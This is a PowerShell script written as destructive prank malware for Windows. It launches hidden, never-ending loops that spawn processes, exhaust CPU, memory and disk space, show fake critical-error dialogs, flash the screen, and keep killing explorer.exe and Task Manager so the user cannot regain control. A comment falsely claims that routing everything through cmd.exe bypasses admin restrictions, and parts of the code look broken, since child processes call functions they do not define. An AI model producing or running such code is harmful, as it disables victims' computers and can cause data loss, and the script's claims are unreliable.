$wshell = New-Object -ComObject WScript.Shell

function Open-EndlessPrograms {
    while ($true) {
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start notepad"
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start cmd"
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start explorer"
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start calc"
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start mspaint"
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start write"
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell"
    }
}

function Overload-CPU {
    while ($true) {
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell -NoProfile -ExecutionPolicy Bypass -Command { while ($true) { 1..1000000 | % { [math]::Pow($_, 2) } } }"
    }
}

function Overload-RAM {
    while ($true) {
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell -NoProfile -ExecutionPolicy Bypass -Command { $array = @(); while ($true) { $array += , (New-Object byte[] (500MB)) } }"
    }
}

function Spam-ErrorMessages {
    while ($true) {
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell -NoProfile -ExecutionPolicy Bypass -Command {[System.Windows.Forms.MessageBox]::Show('CRITICAL ERROR: SYSTEM OVERLOAD!', 'Windows Error', 0, 16)}"
    }
}

function Flood-Disk {
    while ($true) {
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell -NoProfile -ExecutionPolicy Bypass -Command { $file = 'C:\Temp\Crash' + (Get-Random -Minimum 1 -Maximum 999999) + '.txt'; 'MASSIVE SYSTEM FAILURE' * 1000000 | Out-File -FilePath $file }"
    }
}

function Disable-UI {
    while ($true) {
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c taskkill /f /im explorer.exe"
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c taskkill /f /im taskmgr.exe"
    }
}

function Glitch-Screen {
    while ($true) {
        Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell -NoProfile -ExecutionPolicy Bypass -Command { Add-Type -AssemblyName System.Windows.Forms; $form = New-Object System.Windows.Forms.Form; $form.BackColor = 'Red'; $form.WindowState = 'Maximized'; $form.TopMost = $true; $form.FormBorderStyle = 'None'; $form.Show(); Start-Sleep -Milliseconds 20; $form.Close() }"
    }
}

# RUN EVERYTHING USING CMD.EXE TO BYPASS ADMIN RESTRICTIONS
Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell -NoProfile -ExecutionPolicy Bypass -Command { Open-EndlessPrograms }"
Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell -NoProfile -ExecutionPolicy Bypass -Command { Overload-CPU }"
Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell -NoProfile -ExecutionPolicy Bypass -Command { Overload-RAM }"
Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell -NoProfile -ExecutionPolicy Bypass -Command { Spam-ErrorMessages }"
Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell -NoProfile -ExecutionPolicy Bypass -Command { Flood-Disk }"
Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell -NoProfile -ExecutionPolicy Bypass -Command { Disable-UI }"
Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c start powershell -NoProfile -ExecutionPolicy Bypass -Command { Glitch-Screen }"

while ($true) { Start-Sleep 1 }
